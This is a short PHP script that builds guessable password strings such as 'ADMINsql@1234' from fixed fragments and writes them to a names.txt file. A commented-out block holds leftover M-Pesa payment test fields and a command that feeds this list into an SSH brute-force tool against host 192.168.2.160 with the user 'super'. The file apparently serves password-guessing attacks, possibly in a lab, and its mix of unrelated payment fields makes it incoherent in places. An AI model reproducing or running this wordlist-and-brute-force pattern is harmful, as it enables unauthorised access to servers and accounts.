<?php

$firstString = [
    'PUBLIC',
    'External',
    'ADMIN',
    'ERP',
    'MICRO',
    'PG',
    'MS',

]; // Possible groups of letters
$secondString = [
    'server',
    'API',
    'windows',
    'sql',
]; // Possible groups of letters
$thirdString = [
    '@1234'
]; // Possible groups of letters

$obj = [];

function appendNameToFile($fileName, $name) {
    // Open the file for appending
    $file = fopen($fileName, 'a');
    
    // Check if the file was opened successfully
    if ($file) {
        // Write the name to the file with a newline character
        fwrite($file, $name . PHP_EOL);
        
        // Close the file after writing
        fclose($file);
        //echo "Name appended successfully: " . $name . "\n";
    } else {
        echo "Failed to open the file.\n";
    }
}

// Example usage:
$fileName = 'database/names.txt';

// Iterate over each group of letters in the first string
foreach ($firstString as $group1) {
    // Iterate over each group of letters in the second string
    foreach ($secondString as $group2) {
        // Iterate over each group of letters in the third string
        foreach ($thirdString as $group3) {
            // Concatenate the groups of letters to form a word
            $word = $group1 . $group2 . $group3;
            // Output the generated word
            if (!isset($obj['mpesadetails'][$word])) {
                /*
                if ($word == 'TransID') {
                    //$obj['mpesadetails'][$word] = 'BG71U4CAG2';
                } else {
                    $obj['mpesadetails'][0][$word] = '2020_161504';
                }
                    //*/
                    appendNameToFile($fileName,$word); 
            }



            //echo $word . '<br/>';
        }
    }
}

/*
$obj['mpesadetails'][0]['FirstName'] = 'John';
$obj['mpesadetails'][0]['BillRefNumber'] = 'BL-MT-101372';
$obj['mpesadetails'][0]['TransAmount'] = '1000.0';
$obj['mpesadetails'][0]['MSISDN'] = '';
$obj['mpesadetails'][0]['TransChannel'] = 'mpesa';
$obj['mpesadetails'][0]['TransID'] = 'SB5662FDXC';
 ssh-putty-brute -h 192.168.2.160 -p 22 -u super -pw (Get-Content .\names.txt)
//*/

$data = json_encode($obj, JSON_PRETTY_PRINT);

file_put_contents('./lab.json', $data);
